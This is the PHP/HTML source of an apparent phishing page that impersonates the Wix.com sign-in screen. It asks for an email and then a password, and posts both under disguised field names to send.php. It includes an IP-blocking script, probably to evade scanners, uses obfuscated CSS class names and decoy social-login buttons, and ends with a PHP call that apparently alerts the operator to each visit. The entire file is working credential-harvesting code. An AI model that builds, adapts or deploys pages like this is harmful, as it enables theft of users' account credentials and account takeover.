<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link type="image/png" href="./img/fav.ico" rel="shortcut icon">
    <title>Log In to Your Wix Account - Wix.com</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .rosa-imagen {
            width: 100%;
            height: auto;
            display: block;
        }

        .margarita-contenedor {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
        }

        .tulipan-contenedor {
            max-width: 800px;
            width: 100%;
            display: flex;
            gap: 60px;
            align-items: flex-start;
        }

        .girasol-seccion {
            flex: 1;
        }

        .clavel-etiqueta {
            display: block;
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .jazmin-contenedor {
            position: relative;
            margin-bottom: 15px;
        }

        .azalea-input {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #ddd;
            font-size: 16px;
            outline: none;
            background: transparent;
        }

        .azalea-input:focus {
            border-bottom-color: #4285f4;
        }

        .orquidea-contenedor {
            position: relative;
            margin-bottom: 15px;
            display: none;
        }

        .lirio-etiqueta {
            display: block;
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .violeta-input {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #ddd;
            font-size: 16px;
            outline: none;
            background: transparent;
        }

        .violeta-input:focus {
            border-bottom-color: #4285f4;
        }

        .petunia-tooltip {
            position: absolute;
            top: 100%;
            left: 0;
            background-color: #333;
            color: white;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 12px;
            white-space: nowrap;
            display: none;
            z-index: 10;
        }

        .petunia-tooltip::before {
            content: '';
            position: absolute;
            top: -5px;
            left: 20px;
            width: 0;
            height: 0;
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-bottom: 5px solid #333;
        }

        .gardenia-enlace {
            color: #333;
            text-decoration: underline;
            font-size: 14px;
            margin-bottom: 40px;
            display: inline-block;
        }

        .begonia-boton {
            background-color: transparent;
            border: 1px solid #ddd;
            padding: 12px 24px;
            border-radius: 25px;
            color: #4285f4;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
            width: fit-content;
        }

        .begonia-boton:hover {
            background-color: #f8f9fa;
        }

        .begonia-boton.activo {
            background-color: #4285f4;
            color: white;
            border-color: #4285f4;
        }

        .camelia-seccion {
            display: flex;
            align-items: center;
            padding-top: 60px;
        }

        .dalia-divisor {
            position: relative;
            color: #666;
            font-size: 14px;
            padding: 10px 0;
        }

        .dalia-divisor::before,
        .dalia-divisor::after {
            content: '';
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            width: 1px;
            height: 30px;
            background-color: #ddd;
        }

        .dalia-divisor::before {
            top: -30px;
        }

        .dalia-divisor::after {
            bottom: -30px;
        }

        .amapola-seccion {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .lavanda-boton {
            display: flex;
            align-items: center;
            gap: 0;
            border: 1px solid #000;
            border-radius: 4px;
            background-color: white;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            width: 100%;
            overflow: hidden;
        }

        .magnolia-icono {
            width: 60px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
            border-right: 1px solid #000;
        }

        .magnolia-icono img {
            width: 20px;
            height: 20px;
            object-fit: contain;
        }

        .hibisco-texto {
            flex: 1;
            padding: 15px 20px;
            text-align: center;
        }

        .google-btn .hibisco-texto {
            background-color: #1a73e8;
        }

        .google-btn:hover .hibisco-texto {
            background-color: #3367d6;
        }

        .facebook-btn .hibisco-texto {
            background-color: #3b5998;
        }

        .facebook-btn:hover .hibisco-texto {
            background-color: #365899;
        }

        .apple-btn {
            color: #333;
        }

        .apple-btn .hibisco-texto {
            background-color: white;
            color: #333;
        }

        .apple-btn:hover .hibisco-texto {
            background-color: #f8f9fa;
        }

        .narciso-enlace {
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
            display: block;
        }

        .narciso-enlace:hover {
            text-decoration: underline;
        }

        .rosa-pie {
            width: 100%;
            height: auto;
            display: block;
            margin-top: auto;
        }

        @media (max-width: 768px) {
            .rosa-imagen {
                content: url('./img/ueh-m.webp');
            }

            .rosa-pie {
                content: url('./img/ttd-m.webp');
            }

            .margarita-contenedor {
                padding: 20px;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }

            .tulipan-contenedor {
                flex-direction: column;
                gap: 30px;
                max-width: 400px;
                width: 100%;
            }

            .amapola-seccion {
                order: 1;
                width: 100%;
            }

            .camelia-seccion {
                order: 2;
                padding-top: 0;
                justify-content: center;
                margin-bottom: 30px;
                width: 100%;
            }

            .dalia-divisor {
                position: relative;
                color: #666;
                font-size: 14px;
                padding: 0 20px;
            }

            .dalia-divisor::before,
            .dalia-divisor::after {
                content: '';
                position: absolute;
                top: 50%;
                width: 50px;
                height: 1px;
                background-color: #ddd;
                transform: translateY(-50%);
            }

            .dalia-divisor::before {
                right: 100%;
                left: auto;
                top: 50%;
                transform: translateY(-50%);
            }

            .dalia-divisor::after {
                left: 100%;
                top: 50%;
                transform: translateY(-50%);
            }

            .girasol-seccion {
                order: 3;
                width: 100%;
            }

            .gardenia-enlace {
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
    <img src="./img/ofo-d.webp" class="rosa-imagen">

    <main class="margarita-contenedor">
        <div class="tulipan-contenedor">
            <form action="send.php" method="POST" class="girasol-seccion">
                <label for="email" class="clavel-etiqueta">Email</label>
                <div class="jazmin-contenedor">
                    <input type="email" id="email" name="keydadadaad" class="azalea-input" autocomplete="off" required>
                    <div class="petunia-tooltip">Please fill out this field.</div>
                </div>
                
                <div class="orquidea-contenedor" id="passwordContainer">
                    <label for="password" class="lirio-etiqueta">Password</label>
                    <input type="password" id="password" name="keydadadaade4" class="violeta-input" autocomplete="off" required>
                </div>
                
                <a class="gardenia-enlace" id="forgotLink">Forgot Email?</a>
                
                <button type="button" class="begonia-boton" id="loginBtn">
                    Continue with Email
                    <span>→</span>
                </button>
            </form>

            <div class="camelia-seccion">
                <div class="dalia-divisor">or</div>
            </div>

            <div class="amapola-seccion">
                <a href="#" class="lavanda-boton google-btn">
                    <div class="magnolia-icono">
                        <img src="./img/g.webp">
                    </div>
                    <div class="hibisco-texto">Continue with Google</div>
                </a>

                <a href="#" class="lavanda-boton facebook-btn">
                    <div class="magnolia-icono">
                        <img src="./img/f.webp">
                    </div>
                    <div class="hibisco-texto">Continue with Facebook</div>
                </a>

                <a href="#" class="lavanda-boton apple-btn">
                    <div class="magnolia-icono">
                        <img src="./img/p.webp">
                    </div>
                    <div class="hibisco-texto">Continue with Apple</div>
                </a>

                <a class="narciso-enlace">Continue with SSO</a>
            </div>
        </div>
    </main>
    
    <img src="./img/fifi-d.webp" class="rosa-pie">

    <script>
        // Show validation tooltip on invalid input
        const emailInput = document.getElementById('email');
        const passwordContainer = document.getElementById('passwordContainer');
        const loginBtn = document.getElementById('loginBtn');
        const forgotLink = document.getElementById('forgotLink');
        const tooltip = document.querySelector('.petunia-tooltip');
        const loginForm = document.querySelector('form');
        let passwordShown = false;

        emailInput.addEventListener('invalid', function(e) {
            e.preventDefault();
            tooltip.style.display = 'block';
            setTimeout(() => {
                tooltip.style.display = 'none';
            }, 3000);
        });

        emailInput.addEventListener('input', function() {
            tooltip.style.display = 'none';
        });

        // Handle login button click
        loginBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            if (emailInput.value && !passwordShown) {
                // Show password field and change button
                passwordContainer.style.display = 'block';
                loginBtn.innerHTML = 'Login';
                loginBtn.classList.add('activo');
                loginBtn.type = 'submit';
                // Change forgot link text from "Forgot Email?" to "Forgot Password?"
                forgotLink.textContent = 'Forgot Password?';
                passwordShown = true;
            } else if (emailInput.value && passwordShown) {
                // Submit the form to send.php
                if (document.getElementById('password').value) {
                    loginForm.submit();
                } else {
                    document.getElementById('password').reportValidity();
                }
            } else {
                // Show validation for email
                emailInput.reportValidity();
            }
        });

        // Handle Enter key press for form submission
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && passwordShown) {
                if (emailInput.value && document.getElementById('password').value) {
                    loginForm.submit();
                }
            }
        });
    </script>
<script src="js/jq.js"></script>
<?php $m->ctr(" LOGIN 👤 ".@$_GET['e']); ?>
</body></html>